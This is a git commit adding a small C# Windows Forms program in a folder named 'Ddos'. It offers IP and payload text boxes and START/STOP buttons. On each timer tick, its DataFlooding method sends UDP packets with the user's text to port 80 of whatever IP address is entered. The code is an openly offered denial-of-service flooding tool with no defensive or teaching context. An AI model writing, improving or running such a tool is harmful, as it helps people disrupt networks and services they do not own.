c065a40343671f1f4d7098e25c5c1d79c9bb9841
Tony1Sosa <77291686+Tony1Sosa@users.noreply.github.com>
2022-01-13 01:22:57 +0200

    Add files via upload

---
+++ Ddos/Form1.Designer.cs
@@ -0,0 +1,141 @@
+﻿namespace Ddos
+{
+    partial class Form1
+    {
+        /// <summary>
+        ///  Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        ///  Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        ///  Required method for Designer support - do not modify
+        ///  the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            this.label1 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.IpText = new System.Windows.Forms.TextBox();
+            this.dataTextBox = new System.Windows.Forms.TextBox();
+            this.StartBtn = new System.Windows.Forms.Button();
+            this.StopBtn = new System.Windows.Forms.Button();
+            this.timer1 = new System.Windows.Forms.Timer(this.components);
+            this.SuspendLayout();
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Font = new System.Drawing.Font("Segoe UI", 26.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point);
+            this.label1.Location = new System.Drawing.Point(12, 9);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(62, 47);
+            this.label1.TabIndex = 0;
+            this.label1.Text = "Ip:";
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Font = new System.Drawing.Font("Segoe UI", 26.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point);
+            this.label2.Location = new System.Drawing.Point(218, 9);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(237, 47);
+            this.label2.TabIndex = 1;
+            this.label2.Text = "dataTransfer:";
+            // 
+            // IpText
+            // 
+            this.IpText.BackColor = System.Drawing.Color.DimGray;
+            this.IpText.ForeColor = System.Drawing.Color.White;
+            this.IpText.Location = new System.Drawing.Point(68, 24);
+            this.IpText.Multiline = true;
+            this.IpText.Name = "IpText";
+            this.IpText.Size = new System.Drawing.Size(128, 29);
+            this.IpText.TabIndex = 2;
+            // 
+            // dataTextBox
+            // 
+            this.dataTextBox.BackColor = System.Drawing.Color.DimGray;
+            this.dataTextBox.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point);
+            this.dataTextBox.ForeColor = System.Drawing.Color.White;
+            this.dataTextBox.Location = new System.Drawing.Point(218, 65);
+            this.dataTextBox.Multiline = true;
+            this.dataTextBox.Name = "dataTextBox";
+            this.dataTextBox.Size = new System.Drawing.Size(237, 262);
+            this.dataTextBox.TabIndex = 3;
+            // 
+            // StartBtn
+            // 
+            this.StartBtn.BackColor = System.Drawing.Color.DimGray;
+            this.StartBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.StartBtn.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point);
+            this.StartBtn.Location = new System.Drawing.Point(15, 210);
+            this.StartBtn.Name = "StartBtn";
+            this.StartBtn.Size = new System.Drawing.Size(181, 51);
+            this.StartBtn.TabIndex = 4;
+            this.StartBtn.Text = "START";
+            this.StartBtn.UseVisualStyleBackColor = false;
+            this.StartBtn.Click += new System.EventHandler(this.StartBtn_Click);
+            // 
+            // StopBtn
+            // 
+            this.StopBtn.BackColor = System.Drawing.Color.DimGray;
+            this.StopBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.StopBtn.Font = new System.Drawing.Font("Segoe UI", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point);
+            this.StopBtn.Location = new System.Drawing.Point(15, 276);
+            this.StopBtn.Name = "StopBtn";
+            this.StopBtn.Size = new System.Drawing.Size(181, 51);
+            this.StopBtn.TabIndex = 5;
+            this.StopBtn.Text = "STOP";
+            this.StopBtn.UseVisualStyleBackColor = false;
+            this.StopBtn.Click += new System.EventHandler(this.StopBtn_Click);
+            // 
+            // timer1
+            // 
+            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(7F, 15F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(530, 350);
+            this.Controls.Add(this.StopBtn);
+            this.Controls.Add(this.StartBtn);
+            this.Controls.Add(this.dataTextBox);
+            this.Controls.Add(this.IpText);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.label1);
+            this.Name = "Form1";
+            this.Text = "Form1";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.TextBox IpText;
+        private System.Windows.Forms.TextBox dataTextBox;
+        private System.Windows.Forms.Button StartBtn;
+        private System.Windows.Forms.Button StopBtn;
+        private System.Windows.Forms.Timer timer1;
+    }
+}
---
+++ Ddos/Form1.cs
@@ -0,0 +1,68 @@
+﻿using System;
+using System.Drawing;
+using System.Windows.Forms;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
+
+namespace Ddos
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void StartBtn_Click(object sender, EventArgs e)
+        {
+            StartBtn.BackColor = Color.Green;
+            StopBtn.BackColor = Color.DimGray;
+            timer1.Start();
+        }
+
+        private void StopBtn_Click(object sender, EventArgs e)
+        {
+            StopBtn.BackColor = Color.Red;
+            StartBtn.BackColor = Color.DimGray;
+            timer1.Stop();
+        }
+
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            DataFlooding();
+        }
+
+        public void DataFlooding()
+        {
+            UdpClient client = new UdpClient();
+            IPAddress ipAdress = IPAddress.Parse(IpText.Text);
+
+            try
+            {
+                client.Connect(ipAdress,80);
+                byte[] sendBytes = Encoding.ASCII.GetBytes(dataTextBox.Text);
+                client.Send(sendBytes, sendBytes.Length);
+                client.AllowNatTraversal(true);
+                client.DontFragment = true;
+            }
+            catch
+            {
+                MessageBox.Show("Wrong Credentials...",
+                    "Something went wrong.",
+                    MessageBoxButtons.OK,
+                    MessageBoxIcon.Error);
+            }
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            dataTextBox.ReadOnly = false;
+        }
+
+        private void label3_Click(object sender, EventArgs e)
+        {
+
+        }
+    }
+}
